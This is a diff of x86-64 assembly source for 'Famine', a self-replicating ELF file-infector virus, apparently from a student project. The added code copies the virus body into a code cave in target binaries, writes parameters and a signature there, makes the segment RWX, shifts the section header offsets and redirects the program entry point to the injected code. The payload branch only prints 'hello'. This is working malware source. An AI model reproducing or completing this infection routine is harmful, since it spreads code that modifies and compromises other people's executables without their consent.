@@ -8,11 +8,12 @@ global _start
 ; ------------------------ this section exists for packer to work ; to find after excecute segment offset ----------------
 section .packer_sec
     db `haha`, 0
+; ------------------------ this section exists for packer to work ; to find after excecute segment offset ----------------
 
 section .text
 
 params:                                ; filled for infected binaries
-    test_param dq 0x0
+    ent_vaddr_gap dq 0x0
 
 signature db `Famine version 1.0 (c)oded by <jng>-<gdaryl>`,0
 
@@ -28,12 +29,17 @@ main:
     syscall
 
 	; branch for infected file running or running patient 0
-    cmp qword [test_param], 0
+    cmp qword [rel ent_vaddr_gap], 0
     je mother
 
 infected:
     ; TODO: if run as infected, run the same routine as mother
     ; but modify evasion routine and jump to entry address afterward
+    mov rax, 0x0000006f6c6c6568
+    push rax
+    mov rdi, rsp
+    call write_string_nl
+    add rsp, 8
     jmp exit_ok
 
 mother:
@@ -496,6 +502,8 @@ infect_single_file:
     call patching_pass
     pop rsi
 
+    ; TODO: check with ls
+
     ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
     ; if smaller than _end - _start, (WAIT NO)
 
@@ -657,19 +665,83 @@ patching_pass:
 
 	sub rsi, r10
     imul rsi, 0x38
-    sub rdi, rsi
+    sub rdi, rsi ; pheader in question -> rdi
+
+	mov rbx, qword [rdi + 0x10]
+    add rbx, qword [rdi + 0x28]
+    lea rax, [rel _start]
+    lea rcx, [rel params]
+    sub rax, rcx
+    sub rax , 1 ; NOTE: 1 character offset
+    add rbx, rax ; new entry -> rbx
+    
+    ; write parameters and signature
+    push rdi
+    mov rsi, r8
+    mov rcx, rbx
+    mov rdx, r9
+    call write_params
+    pop rdi
+
+    ; write shellcode
+    push rdi
+    mov rdi, rax
+    call write_shellcode
+    pop rdi
+
+    ; change segment permission to RWX
+    mov dword [rdi + 0x04], 0x7
 
     ; change mem and file size
     add qword [rdi + 0x20], MAX_FILE_PAD
     add qword [rdi + 0x28], MAX_FILE_PAD
 
+	; change section header offset
+    add qword [r9 + 0x28], MAX_FILE_PAD
+
+    ; change entry
+    mov qword [r9 + 0x18], rbx
+
+    ; get file offset of segment
+    mov rax, qword [rdi + 0x08]
+    add rax, qword [rdi + 0x28]  ; segment file offset + size -> rax
+
     ; locate section header for start offset
+    mov rdi, r9
+    add rdi, 0x28
+    mov rdi, qword [rdi]
+    add rdi, r9; section header table address -> rdi
 
-    ; if section header in range, change its offset only 
-    
-    ; change section table offset
+    movzx rsi, word [r9 + 0x3C] ; shnum  -> rsi
 
-    ; change entry address and return the delta
+    mov rbx, 0
+
+.shloop:
+    ; locate sectors which are after codecave
+    cmp rbx, rsi
+    jge .shloop_end
+
+    ; adjusted offset -> rdx
+    mov rdx, qword [rdi + 0x18]
+    add rdx, MAX_FILE_PAD
+    add rdx, 10 ; NOTE: hacky equal offset fix. TODO: inspect this.
+
+    ; is it bigger than segment file offset + size rax?
+    cmp rdx, rax
+    jl .shloop_iter
+
+	; if it is, add the offset
+    add qword [rdi + 0x18], MAX_FILE_PAD
+
+    ; NOTE: ignoring vaddr here because the 
+    ; codecave should not have addressing after it
+
+.shloop_iter:
+    add rbx, 1
+    add rdi, 0x40
+    jmp .shloop
+
+.shloop_end:
 
 
 .ret:
@@ -678,6 +750,69 @@ patching_pass:
     pop r10
     pop rbx
     ret
+
+; rdi - pointer to dst buffer
+; returns pointer to end of dst
+write_shellcode:
+    push r8
+    push r9
+    push r10
+
+    lea r8, [rel _end] ; end addr
+    lea r9, [rel _start]; start addr
+
+    mov rdx, r8
+    sub rdx, r9
+
+	mov rsi, r9
+    call memcpy
+
+
+.ret:
+	pop r10
+    pop r9
+    pop r8
+    ret
+
+; rdi - pheader in question
+; rsi - old entry
+; rcx - new entry
+; rdx - mmap buf
+; returns - mmap buffer to fill next
+write_params:
+	push rbx
+    push r8
+
+
+	; calculate offset to write in file
+    ; account for uninitialized extra mem space
+    mov r8, qword [rdi + 0x8]
+    add r8, qword [rdi + 0x28] ; file offset at edge -> r8
+
+    ; calculate entry gap from _start (incl param + signature gap)
+    mov rbx, rcx
+    sub rbx, qword [rdi + 0x10]
+    sub rbx, qword [rdi + 0x28] ; diff between new entry and vaddr edge (param + signature gap) -> rbx
+
+    mov rax, rcx
+    sub rax, rsi
+    add rax, rbx ; entry gap -> rax
+
+    add rdx, r8
+    mov qword [rdx], rax
+
+    add rdx, 8 ; increment qword size
+    
+    lea rsi, [rel signature]
+    mov rdi, rdx
+    call strcpy
+
+
+.ret:
+    pop r8
+    pop rbx
+    ret
+
 
 ; rdi - mmap buf
 ; rsi - file size
@@ -819,6 +954,12 @@ write_string_nl:
     pop rdi
     ret
 
+; rdi - destination buffer
+; rsi - source buffer
+; rdx - number of bytes to copy
+; returns rax - pointer to the end of the destination buffer
+; clobbers rdi, rsi, rax
+; preserves rcx
 memcpy:
     push rcx
     mov rcx, rdx
@@ -827,6 +968,11 @@ memcpy:
     pop rcx
     ret
 
+; rdi - destination buffer
+; rsi - source null-terminated string
+; returns rax - pointer to the null terminator in the destination buffer
+; clobbers rdi, rsi, rax
+; preserves rcx
 strcpy:
     push    rcx
     mov     rax, rdi
